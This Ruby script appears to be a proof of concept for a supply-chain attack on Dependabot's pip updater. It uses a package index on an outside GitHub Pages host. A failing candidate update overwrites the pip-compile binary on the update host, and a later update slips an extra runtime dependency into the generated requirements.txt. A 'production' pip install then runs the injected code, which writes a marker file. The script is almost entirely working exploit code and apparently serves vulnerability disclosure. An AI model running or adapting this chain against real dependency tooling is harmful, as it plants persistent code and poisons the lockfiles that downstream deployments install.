# frozen_string_literal: true

require "digest"
require "fileutils"
require "json"
require "open3"
require "tmpdir"

require "dependabot"
require "dependabot/dependency"
require "dependabot/dependency_file"
require "dependabot/python/file_updater"

PAGES_BASE = "https://per0x1de-1337.github.io/dependabot-pip-boundary-index/"
INDEX_BASE = ENV.fetch("BOUNDARY_INDEX_BASE", PAGES_BASE)
FIXTURE_ROOT = ENV.fetch("BOUNDARY_FIXTURE_ROOT", __dir__)
ENTRYPOINT = "/usr/local/.pyenv/versions/3.14.7/bin/pip-compile"

def file(name)
  content = File.read(File.join(FIXTURE_ROOT, "victim/pip", name)).gsub(PAGES_BASE, INDEX_BASE)
  Dependabot::DependencyFile.new(name: name, content: content, directory: "/")
end

def dependency(name, old_version, new_version)
  old_requirement = [{
    file: "requirements.in",
    requirement: "==#{old_version}",
    groups: [],
    source: nil
  }]
  new_requirement = [{
    file: "requirements.in",
    requirement: "==#{new_version}",
    groups: [],
    source: nil
  }]
  Dependabot::Dependency.new(
    name: name,
    version: new_version,
    previous_version: old_version,
    requirements: new_requirement,
    previous_requirements: old_requirement,
    package_manager: "pip"
  )
end

def update(files, dependency)
  Dependabot::Python::FileUpdater.new(
    dependency_files: files,
    dependencies: [dependency],
    credentials: []
  ).updated_dependency_files
end

def run!(*argv, chdir:, env: {})
  output, status = Open3.capture2e(env, *argv, chdir: chdir)
  raise "#{argv.inspect} failed:\n#{output}" unless status.success?

  output
end

raise "pip-compile entrypoint is not writable" unless File.writable?(ENTRYPOINT)
entrypoint_before = File.read(ENTRYPOINT)
sha_before = Digest::SHA256.hexdigest(entrypoint_before)

begin
  baseline_files = [file("requirements.in"), file("requirements.txt")]
  candidate_error = begin
    update(baseline_files, dependency("db-boundary-candidate", "1.0.0", "1.0.1"))
    nil
  rescue StandardError => error
    error
  end
  raise "candidate unexpectedly succeeded" unless candidate_error

  sha_after = Digest::SHA256.file(ENTRYPOINT).hexdigest
  if sha_after == sha_before
    raise "candidate did not patch pip-compile: #{candidate_error.class}: #{candidate_error.message}"
  end

  updated_files = update(baseline_files, dependency("db-boundary-host", "1.0.0", "1.0.1"))
  lockfile = updated_files.find { |updated_file| updated_file.name == "requirements.txt" }
  raise "missing requirements.txt" unless lockfile
  unless lockfile.content&.include?("db-boundary-runtime==1.0.0\n    # via db-boundary-host")
    raise "runtime dependency was not injected"
  end
  raise "failed candidate leaked into output" if lockfile.content&.include?("db-boundary-candidate==1.0.1")

  Dir.mktmpdir("dependabot-pip-boundary-production-") do |deployment|
    File.write(File.join(deployment, "requirements.txt"), lockfile.content)
    marker = File.join(deployment, "production-marker")
    run!(
      "pyenv", "exec", "pip", "install", "--no-build-isolation", "--target", File.join(deployment, "site"),
      "-r", "requirements.txt",
      chdir: deployment,
      env: { "DEPENDABOT_PRODUCTION_MARKER" => marker }
    )
    raise "production marker missing" unless File.read(marker) == "DEPENDABOT_PIP_COMPILE_OUTPUT_MARKER\n"

    puts JSON.pretty_generate(
      result: "HOSTED_FIXTURE_LOCAL_E2E_CONFIRMED",
      candidate_error: candidate_error.class.name,
      pip_compile_sha256_before: sha_before,
      pip_compile_sha256_after: sha_after,
      final_dependency: "db-boundary-host@1.0.1",
      returned_files: updated_files.map(&:to_h),
      production_marker: File.read(marker)
    )
  end
ensure
  File.write(ENTRYPOINT, entrypoint_before)
end
